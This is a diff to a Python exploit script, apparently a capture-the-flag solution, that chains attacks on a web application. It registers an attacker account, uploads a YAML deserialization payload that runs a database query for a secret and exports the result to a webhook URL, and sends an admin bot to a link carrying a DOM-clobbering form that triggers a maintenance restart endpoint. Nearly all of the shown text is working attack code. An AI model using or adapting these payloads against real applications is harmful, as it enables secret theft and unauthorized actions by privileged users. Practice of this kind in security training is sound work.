@@ -10,7 +10,9 @@ session = requests.Session()
 def register_and_login():
     """Creates a new account and logs in."""
     print("[+] Step 0: Registering and authenticating attacker account...")
+
     session.post(f"{TARGET_URL}/api/v1/auth/register", json={"username": "attacker", "password": "password123"})
+    
     resp = session.post(f"{TARGET_URL}/api/v1/auth/login", json={"username": "attacker", "password": "password123"})
     
     if resp.status_code == 200:
@@ -27,7 +29,7 @@ version: "1.0"
 user_profile: "Attacker"
 trigger_exploit: !!python/object/apply:app.utils.cluster_utils.DatabaseExporter
   kwds:
-    query: "SELECT secret_value FROM system_secrets WHERE secret_name='infrastructure_flag';"
+    query: "SELECT secret_value FROM system_secrets WHERE secret_name='FLAG';"
     export_url: "{WEBHOOK_URL}"
 """
 
@@ -40,9 +42,11 @@ def upload_profile(payload):
 
 def trigger_admin_bot():
     print("[+] Step 2: Crafting DOM Clobbering payload...")
+
     clobber_payload = '<form id="ANALYTICS_CONFIG" action="/api/v1/infra/maintenance/restart" method="POST"></form>'
     encoded_bio = urllib.parse.quote(clobber_payload)
-    weaponized_url = f"{TARGET_URL}/u/attacker?bio={encoded_bio}"
+    
+    weaponized_url = f"{TARGET_URL}/profile/attacker?bio={encoded_bio}"
     
     print(f"[*] Dispatching Admin Bot to {weaponized_url}")
     session.post(f"{TARGET_URL}/api/v1/support/ticket", json={"url": weaponized_url})
